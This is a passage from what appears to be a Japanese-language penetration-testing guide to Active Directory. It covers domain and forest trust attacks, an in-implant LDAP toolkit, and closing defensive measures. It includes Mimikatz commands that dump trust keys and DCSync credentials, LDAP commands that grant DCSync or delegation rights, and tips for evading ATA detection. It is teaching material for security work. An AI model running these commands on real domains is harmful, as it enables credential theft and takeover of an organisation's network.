[SSP (Security Support Provider) とは何かはこちらを参照してください。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の **SSP** を作成して、マシンへアクセスする際に使用される **credentials を平文でキャプチャ** することができます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD に **新しい Domain Controller を登録** し、それを使って指定したオブジェクトに対して（SIDHistory、SPNs...）の属性を **ログを残さずに push** します。これを行うには DA 権限とルートドメイン内での操作が必要です。\
ただし、誤ったデータを使用するとかなり目立つログが出る点に注意してください。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前述の通り、LAPS パスワードを読む十分な権限があれば権限昇格が可能ですが、これらのパスワードは永続化にも使用できます。\
参照：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft は **Forest** をセキュリティ境界と見なしています。これは、**単一ドメインを侵害することで Forest 全体が危険にさらされる可能性がある**ことを意味します。

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) は、ある **domain** のユーザーが別の **domain** のリソースにアクセスできるようにするセキュリティメカニズムです。これは二つのドメインの認証システム間に連携を作り、認証情報のやり取りがスムーズに行われるようにします。ドメインが trust を設定すると、特定の **keys** をそれぞれの **Domain Controllers (DCs)** に交換・保持し、この trust の整合性を保ちます。

典型的なシナリオでは、ユーザーが **trusted domain** のサービスにアクセスするには、まず自分のドメインの DC から **inter-realm TGT** を要求する必要があります。この TGT は両ドメインが共有する **key** で暗号化されます。ユーザーはこの TGT を **trusted domain の DC** に提示してサービスチケット（**TGS**）を取得します。trusted domain の DC が inter-realm TGT を検証すると、有効であれば TGS を発行し、ユーザーにサービスへのアクセスを許可します。

**手順**:

1. **Domain 1** のクライアントコンピュータが自身の **NTLM hash** を使って **Domain Controller (DC1)** に **Ticket Granting Ticket (TGT)** を要求します。
2. DC1 はクライアントが認証されると新しい TGT を発行します。
3. クライアントはその後、**Domain 2** のリソースにアクセスするために DC1 から **inter-realm TGT** を要求します。
4. inter-realm TGT は、2-way domain trust の一部として DC1 と DC2 が共有する **trust key** で暗号化されます。
5. クライアントは inter-realm TGT を **Domain 2 の Domain Controller (DC2)** に持っていきます。
6. DC2 は共有された trust key を使って inter-realm TGT を検証し、有効であればクライアントがアクセスしたい Domain 2 のサーバーに対して **Ticket Granting Service (TGS)** を発行します。
7. 最後に、クライアントはこの TGS をサーバーに提示し（サーバーのアカウント hash で暗号化されている）、Domain 2 のサービスにアクセスします。

### Different trusts

trust が **一方向** か **双方向** かが存在する点に注意してください。双方向の場合、両ドメインは互いを信頼しますが、**一方向** の trust では一方が **trusted**、もう一方が **trusting** ドメインになります。この場合、**trusted 側からは trusting ドメイン内のリソースにのみアクセス可能**です。

Domain A が Domain B を信頼している場合、A が trusting domain、B が trusted domain です。さらに、**Domain A ではこれが Outbound trust** になり、**Domain B では Inbound trust** になります。

**様々な trusting 関係**

- **Parent-Child Trusts**: 同一フォレスト内でよく見られる構成で、child domain は自動的に parent domain と双方向の遷移 trust を持ちます。これにより親と子の間で認証要求が透過的に流れます。
- **Cross-link Trusts**: "shortcut trusts" と呼ばれ、child domain 間で referral を高速化するために設定されます。複雑なフォレストでは認証 referral が forest root まで上がってから目的のドメインへ降りる必要がありますが、cross-links によってその経路が短縮されます。
- **External Trusts**: 異なる、無関係なドメイン間で設定される非遷移的な trust です。Microsoft のドキュメントによれば、external trusts は forest trust で接続されていないフォレスト外のドメインのリソースへアクセスする際に有用です。外部 trust では SID filtering によってセキュリティが強化されます。
- **Tree-root Trusts**: フォレストのルートドメインと新しく追加された tree root 間で自動的に確立される trust です。一般的ではありませんが、フォレストに新しいドメインツリーを追加する際に重要で、二方向の遷移性を維持します。
- **Forest Trusts**: これは二つの forest root domains 間の双方向遷移 trust で、SID filtering によるセキュリティ強化も行います。
- **MIT Trusts**: RFC4120 準拠の Kerberos ドメイン（非 Windows）と確立される trust です。MIT trusts は Windows 以外の Kerberos ベースのシステムとの統合を必要とする環境向けです。

#### Other differences in **trusting relationships**

- trust 関係は **transitive**（A が B を信頼、B が C を信頼なら A は C を信頼）にも **non-transitive** にもできます。
- trust 関係は **bidirectional trust**（相互に信頼）として、あるいは **one-way trust**（一方のみが他方を信頼）として設定できます。

### Attack Path

1. trusting relationships を **列挙** する
2. どの **security principal**（user/group/computer）が **他ドメインのリソースにアクセスできるか** を確認する。ACE エントリや他ドメインのグループに含まれているかを調べ、**ドメイン間の関係** を探す（おそらく trust はそのために作られている）。
1. この場合 kerberoast も別のオプションになり得ます。
3. ドメインを横断して **pivot** できるアカウントを **compromise** する。

攻撃者が別ドメインのリソースにアクセスする手段は主に次の三つです：

- **Local Group Membership**: プリンシパルがマシン上の "Administrators" グループのようなローカルグループに追加されると、そのマシンに対する大きな制御権を得ます。
- **Foreign Domain Group Membership**: プリンシパルが外部ドメイン内のグループのメンバーである場合もあります。ただし、この方法の有効性は trust の種類やグループの範囲に依存します。
- **Access Control Lists (ACLs)**: プリンシパルが ACL、特に DACL 内の ACE として指定されている場合、特定のリソースへのアクセスが付与されます。ACL、DACL、ACE の仕組みを深く理解したい場合、ホワイトペーパー “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” が非常に参考になります。

### Find external users/groups with permissions

ドメイン内の foreign security principals を見つけるには **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認できます。これらは **外部の domain/forest** からの user/group です。

これを Bloodhound か powerview を使って確認できます：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメイン信頼を列挙する他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2つの trusted keys** があり、1つは _Child --> Parent_、もう1つは _Parent_ --> _Child_ 用です。\
> 現在のドメインで使用されているキーは次のコマンドで確認できます:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection を悪用してトラストを利用し、child/parent domain に対して Enterprise admin として権限昇格します:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) がどのように悪用されうるかを理解することは重要です。Configuration NC は Active Directory (AD) 環境におけるフォレスト全体の構成データの中央リポジトリとして機能します。このデータはフォレスト内のすべての Domain Controller (DC) にレプリケートされ、書き込み可能な DC は Configuration NC の書き込み可能なコピーを保持します。これを悪用するには、**DC 上での SYSTEM 権限**（できれば子 DC）が必要です。

**Link GPO to root DC site**

Configuration NC の Sites コンテナには、AD フォレスト内のドメイン参加コンピュータのサイト情報が含まれます。任意の DC 上で SYSTEM 権限を持つことで、攻撃者は GPO をルート DC のサイトにリンクできます。この操作は、これらのサイトに適用されるポリシーを操作することでルートドメインを危険にさらす可能性があります。

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

攻撃ベクターとしては、ドメイン内の特権 gMSA を狙うものがあります。gMSA のパスワード計算に必要な KDS Root key は Configuration NC に格納されています。任意の DC 上で SYSTEM 権限を持てば、KDS Root key にアクセスしてフォレスト内の任意の gMSA のパスワードを算出することが可能です。

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

この手法は、新たに作成される特権 AD オブジェクトが現れるのを待つ忍耐を要します。SYSTEM 権限を持てば、攻撃者は AD スキーマを変更して任意のユーザに全クラスに対する完全なコントロールを与えることができます。これにより、新たに作成された AD オブジェクトに対する不正なアクセスと支配が可能になります。

**From DA to EA with ADCS ESC5**

ADCS ESC5 の脆弱性は、PKI オブジェクトを操作してフォレスト内の任意のユーザとして認証できる証明書テンプレートを作成することを狙います。PKI オブジェクトは Configuration NC に存在するため、書き込み可能な子 DC を乗っ取れば ESC5 攻撃を実行できます。

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインが外部ドメインから信頼されており**、それにより**外部ドメインに対して不明確な権限**が付与されています。あなたは、**あなたのドメイン内のどのプリンシパルが外部ドメインに対してどのようなアクセス権を持っているか**を特定し、それを悪用しようと試みる必要があります:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部フォレストドメイン - 一方向（アウトバウンド）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは、**あなたのドメイン** が **別のドメイン** のプリンシパルにいくつかの **権限** を **信頼している** 状態です。

しかし、信頼側のドメインによって **ドメインが信頼される** と、信頼されたドメインは **予測可能な名前** を持つ **ユーザーを作成し**、**パスワードとして信頼パスワードを使用します**。つまり、**信頼するドメインのユーザーにアクセスして信頼されたドメイン内に侵入し**、列挙やさらなる権限昇格を試みることが可能になる、ということです：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

別の方法として、信頼関係の**逆方向**に作成された[**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)を見つけることで、信頼されたドメインを侵害する手段があります（これはあまり一般的ではありません）。

別の方法として、攻撃者は**信頼ドメインのユーザーがアクセスできる**マシンで待ち構え、ユーザーが**RDP**でログインしたところを狙うことがあります。攻撃者はRDPセッションプロセスにコードを注入し、そこから**被害者のオリジンドメインにアクセスする**ことができます。さらに、もし**被害者がハードドライブをマウントしていれば**、**RDP session**プロセスからハードドライブの**startup folder**に**backdoors**を設置することが可能です。この手法は**RDPInception.**と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### ドメイントラスト悪用の緩和

### **SID Filtering:**

- フォレスト間のトラストを横断してSID history属性を悪用する攻撃のリスクは、SID Filteringによって軽減されます。SID Filteringはすべてのフォレスト間トラストでデフォルトで有効になっています。これは、マイクロソフトの立場に従い、セキュリティ境界をドメインではなくフォレストとして扱い、フォレスト内トラストを安全と想定していることに基づいています。
- ただし注意点として、SID Filteringはアプリケーションやユーザーのアクセスを阻害する可能性があり、そのため一時的に無効化されることがあります。

### **Selective Authentication:**

- フォレスト間トラストにおいてSelective Authenticationを用いると、両フォレストのユーザーが自動的に認証されることを防げます。代わりに、信頼側のドメインやフォレスト内のドメインやサーバに対するアクセスには明示的な権限が必要になります。
- これらの対策は、書き込み可能な Configuration Naming Context (NC) の悪用やトラストアカウントへの攻撃を防ぐものではない点に留意してください。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## On-Host インプラントからの LDAP ベースの AD 悪用

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は、bloodyAD-style の LDAP プリミティブを x64 Beacon Object Files として再実装し、オンホストインプラント（例: Adaptix C2）内部で完全に動作します。オペレータは `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` でパックをコンパイルし、`ldap.axs` をロードしてビーコンから `ldap <subcommand>` を呼び出します。すべてのトラフィックは現在のログオンのセキュリティコンテキスト上で LDAP (389) の署名/シーリング、または自動証明書信頼を使った LDAPS (636) を経由するため、socks プロキシやディスク上のアーティファクトは不要です。

### インプラント側の LDAP 列挙

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` は短い名前や OU パスを完全な DN に解決し、対応するオブジェクトをダンプします。
- `get-object`, `get-attribute`, and `get-domaininfo` は任意の属性（security descriptors を含む）や `rootDSE` からのフォレスト/ドメインのメタデータを取得します。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` は roasting candidates、委任設定、および LDAP から直接取得した既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) ディスクリプタを露出させます。
- `get-acl` and `get-writable --detailed` は DACL を解析してトラスティー、権利（GenericAll/WriteDACL/WriteOwner/attribute writes）および継承を列挙し、ACL による権限昇格の即時ターゲットを提供します。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) により、OU 権限がある場所へ新しいプリンシパルやマシンアカウントを配置できます。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は write-property 権限が見つかると対象を直接乗っ取ります。
- `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync` といった ACL 中心のコマンドは、任意の AD オブジェクト上の WriteDACL/WriteOwner をパスワードリセット、グループメンバー制御、または DCSync レプリケーション権限に変換し、PowerShell/ADSI の痕跡を残さずに実行できます。`remove-*` 系のコマンドは注入した ACE をクリーンアップします。

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` は侵害されたユーザーを即座に Kerberoastable にします。`add-asreproastable`（UAC トグル）はパスワードに触れずに AS-REP roasting 用にマークします。
- Delegation マクロ（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は beacon から `msDS-AllowedToDelegateTo`、UAC フラグ、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換え、constrained/unconstrained/RBCD の攻撃経路を有効にし、リモート PowerShell や RSAT の必要性を排除します。

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` は特権 SID を制御下のプリンシパルの SID history に注入します（see [SID-History Injection](sid-history-injection.md)）。これにより LDAP/LDAPS 上でステルスなアクセス継承が可能になります。
- `move-object` はコンピュータやユーザーの DN/OU を変更し、攻撃者が `set-password`、`add-groupmember`、または `add-spn` を悪用する前に、既に委任権限が存在する OU に資産を移動できます。
- スコープを限定した削除コマンド（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` など）により、オペレーターが資格情報や永続化を収集した後に迅速にロールバックでき、テレメトリを最小化します。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Domain Admins は Domain Controllers のみにログインを許可し、他のホストでの使用を避けることが推奨されます。
- **Service Account Privileges**: サービスは DA 権限で実行されるべきではありません。
- **Temporal Privilege Limitation**: DA 権限を必要とするタスクについては、その期間を限定するべきです。例: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- 欺瞞の実装は罠の設置（例：パスワードが期限切れにならない、または Trusted for Delegation にマークされたデコイユーザーやコンピューター）を伴います。詳細なアプローチには、特定の権限を持つユーザーを作成したり、高権限グループに追加したりすることが含まれます。
- 実用例: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- More on deploying deception techniques can be found at [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: 疑わしい指標には、典型的でない ObjectSID、ログオン頻度の低さ、作成日時、低い bad password カウントなどが含まれます。
- **General Indicators**: 潜在的なデコイオブジェクトの属性を正規のオブジェクトと比較することで不整合を見つけられます。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) のようなツールが欺瞞の識別を支援します。

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA 検出を避けるために、Domain Controllers 上でのセッション列挙を避けます。
- **Ticket Impersonation**: チケット作成に **aes** キーを使用することで、NTLM にフォールバックしないため検出を回避しやすくなります。
- **DCSync Attacks**: ATA 検出を避けるためには、Domain Controller 以外から実行することが推奨されます。Domain Controller から直接実行するとアラートが発生します。

## 参考

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
